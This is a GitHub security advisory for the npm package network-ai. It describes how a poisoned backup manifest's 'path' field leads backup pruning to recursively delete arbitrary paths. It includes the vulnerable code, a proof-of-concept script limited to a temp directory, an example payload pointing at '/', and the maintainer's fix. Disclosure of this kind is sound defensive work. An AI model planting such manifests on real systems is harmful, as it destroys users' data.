# [H] Network-AI: Poisoned environment backup manifest allows arbitrary recursive deletion during backup pruning

## Summary
Severity: High
Advisory: GHSA-2fmp-9rvw-hc96
CWE: CWE-22, CWE-73
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-2fmp-9rvw-hc96
Type: github-advisory

## Affected
- npm: `network-ai` — affected >=0 <5.12.2

## Details
### Summary
`EnvironmentManager.listBackups()` reads each backup's `_manifest.json` and trusts the manifest's `path` field. `EnvironmentManager.pruneBackups()` later passes that trusted `entry.path` directly to `rmSync(entry.path, { recursive: true, force: true })`.

An attacker who can place or modify a manifest inside `data/<env>/.backups/<name>/_manifest.json` can cause `network-ai env backup prune --env <env> --keep <n>` or any code path invoking `pruneBackups()` to recursively delete an arbitrary path accessible to the Network-AI process user. Confirmed in Network-AI 5.12.1.

### Details
`listBackups()` trusts manifest content from disk:

```ts
for (const name of readdirSync(backupsDir)) {
  const manifest = join(backupsDir, name, '_manifest.json');
  if (existsSync(manifest)) {
    try {
      const entry = JSON.parse(readFileSync(manifest, 'utf-8')) as BackupEntry;
      entries.push(entry);
    } catch { /* corrupt manifest, skip */ }
  }
}
```

`pruneBackups()` uses the attacker-controlled `entry.path` as the deletion target:

```ts
const toDelete = all.slice(keep);
let deleted = 0;
for (const entry of toDelete) {
  try {
    rmSync(entry.path, { recursive: true, force: true });
    deleted++;
  } catch { /* ignore */ }
}
```

Default CLI reachability exists through `network-ai env backup prune --env <env> --keep <n>`.

Affected source evidence:

- `lib/env-manager.ts:505-523` — reads trusted backup entries from `_manifest.json`.
- `lib/env-manager.ts:529-541` — recursively deletes `entry.path`.
- `bin/cli.ts:464-472` — default CLI exposes backup pruning.

### PoC
This PoC uses only a temporary directory and deletes only a temporary file:

```bash
TMP=$(mktemp -d)
TMPBASE="$TMP" node -r ts-node/register/transpile-only - <<'TS'
const { EnvironmentManager } = require('./lib/env-manager');
const fs = require('fs');
const path = require('path');
const base = process.env.TMPBASE;

const mgr = new EnvironmentManager(path.join(base, 'data'), {
  chain: ['dev', 'st'],
  gates: { dev: 'auto', st: 'auto' },
});

mgr.init('dev');
fs.writeFileSync(path.join(base, 'victim.txt'), 'safe');

const backupsDir = path.join(base, 'data', 'dev', '.backups');
fs.mkdirSync(path.join(backupsDir, 'evil'), { recursive: true });
fs.writeFileSync(
  path.join(backupsDir, 'evil', '_manifest.json'),
  JSON.stringify({
    backupId: 'evil',
    env: 'dev',
    timestamp: '2000-01-01T00:00:00.000Z',
    sizeBytes: 0,
    path: path.join(base, 'victim.txt'),
  })
);

console.log(JSON.stringify({
  before: fs.existsSync(path.join(base, 'victim.txt')),
  deleted: mgr.pruneBackups('dev', 0),
  after: fs.existsSync(path.join(base, 'victim.txt')),
}, null, 2));

fs.rmSync(base, { recursive: true, force: true });
TS
```

Observed result: `before` is `true`, `deleted` is `1`, and `after` is `false`, proving deletion occurred outside `data/dev/.backups`.

### Impact
An attacker with write access to the Network-AI data directory can cause recursive deletion of arbitrary filesystem paths accessible to the Network-AI process user when backup pruning runs. This can delete project files, data directories, or other process-writable paths, causing data loss and denial of service. No RCE chain was confirmed.


---

### Resolution (maintainer)

**Fixed in [v5.12.2](https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2) (commit `a59c13a`).** Install: `npm install network-ai@5.12.2` — published to npm with provenance.

`pruneBackups()` no longer passes `entry.path` from the on-disk manifest to `rmSync`. The deletion path is recomputed from a format-validated `entry.backupId`, and a `dirname` containment check confines deletion to exactly one level under the backups directory. A poisoned manifest (e.g. `"path": "/"`) is now inert.

All 3,269 tests pass against the patched build. Thanks to @sondt99 for the responsible disclosure.

## References
- https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-2fmp-9rvw-hc96
- https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3
- https://github.com/Jovancoding/Network-AI
- https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2
